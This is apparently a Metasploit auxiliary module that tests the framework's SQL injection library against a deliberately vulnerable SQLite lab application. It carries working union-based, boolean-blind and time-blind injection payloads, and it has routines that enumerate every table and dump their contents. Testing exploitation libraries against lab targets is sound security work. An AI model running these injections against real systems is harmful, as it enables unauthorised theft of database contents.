# frozen_string_literal: true

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::SQLi
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SQLite injection testing module',
        'Description' => %q{
          This module tests the SQL injection library against the  SQLite database management system
          The target : https://github.com/incredibleindishell/sqlite-lab
        },
        'Author' =>
          [
            'Redouane NIBOUCHA <rniboucha[at]yahoo.fr>'
          ],
        'License' => MSF_LICENSE,
        'Platform' => %w[linux],
        'References' =>
          [],
        'Targets' => [['Wildcard Target', {}]],
        'DefaultTarget' => 0
      )
    )
    register_options(
      [
        Opt::RHOST('127.0.0.1'),
        OptString.new('TARGETURI', [true, 'The target URI', '/']),
        OptInt.new('SQLI_TYPE', [true, '0)Regular. 1) BooleanBlind. 2)TimeBlind', 0]),
        OptString.new('ENCODER', [false, 'an encoder to use (hex for example)', '']),
        OptBool.new('HEX_ENCODE_STRINGS', [false, 'replace strings in the query with hex numbers?', false]),
        OptFloat.new('SQLI_SLEEP', [true, 'The delay in time-based injections', 0.3])
      ]
    )
  end

  def boolean_blind
    encoder = datastore['ENCODER'].empty? ? nil : datastore['ENCODER'].intern
    sqli = SQLitei::BooleanBasedBlind.new({
      verbose: datastore['VERBOSE'],
      encoder: encoder,
      hex_encode_strings: datastore['HEX_ENCODE_STRINGS']
    }) do |payload|
      res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path, 'index.php'),
        'method' => 'POST',
        'vars_post' => {
          'tag' => "' or #{payload}--",
          'search' => 'Check Plan'
        }
      })
      res.body.include?('Dear')
    end
    unless sqli.test_vulnerable
      print_bad("Doesn't seem to be vulnerable")
      return
    end
    perform_sqli(sqli)
  end

  def reflected
    encoder = datastore['ENCODER'].empty? ? nil : datastore['ENCODER'].intern
    sqli = SQLitei::Common.new({
      verbose: datastore['VERBOSE'],
      encoder: encoder,
      hex_encode_strings: datastore['HEX_ENCODE_STRINGS']
    }) do |payload|
      res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path, 'index.php'),
        'method' => 'GET',
        'vars_get' => {
          'tag' => "' and 1=2 union select 1,(#{payload}),3,4,5--"
        }
      })
      if !res
        ''
      else
        body = res.body[%r{Default Operating system</td><td width="40%" align=left style="padding: 5px;color:#ff9933;">(.*?)</td></tr><tr><td}m, 1]
        if !body
          ''
        else
          body.strip
        end
      end
    end
    unless sqli.test_vulnerable
      print_bad("Doesn't seem to be vulnerable")
      return
    end
    perform_sqli(sqli)
  end

  def time_blind
    encoder = datastore['ENCODER'].empty? ? nil : datastore['ENCODER'].intern
    sqli = SQLitei::TimeBasedBlind.new({
      verbose: datastore['VERBOSE'],
      encoder: encoder,
      hex_encode_strings: datastore['HEX_ENCODE_STRINGS'],
      sleepdelay: datastore['SQLI_SLEEP']
    }) do |payload|
      res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path, 'index.php'),
        'method' => 'POST',
        'vars_post' => {
          'tag' => "' or #{payload}--",
          'search' => 'Check Plan'
        }
      })
      raise ArgumentError unless res
    end
    unless sqli.test_vulnerable
      print_bad("Doesn't seem to be vulnerable")
      return
    end
    perform_sqli(sqli)
  end

  def perform_sqli(sqli)
    print_good "dbms: #{sqli.version}"
    tables = sqli.enum_table_names
    print_good "tables: #{tables.join(', ')}"
    tables.each do |table|
      columns = sqli.enum_table_columns(table)
      print_good "#{table}(#{columns.join(', ')})"
      content = sqli.dump_table_fields(table, columns)
      content.each do |row|
        print_good "\t" + row.join(', ')
      end
    end
  end

  def check
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'method' => 'GET'
    })
    if res && res.body.include?('--==[[IndiShell Lab]]==--')
      Exploit::CheckCode::Vulnerable
    else
      Exploit::CheckCode::Safe
    end
  end

  def run
    case datastore['SQLI_TYPE']
    when 0 then reflected
    when 1 then boolean_blind
    when 2 then time_blind
    else print_bad('Unsupported SQLI_TYPE')
    end
  end
end
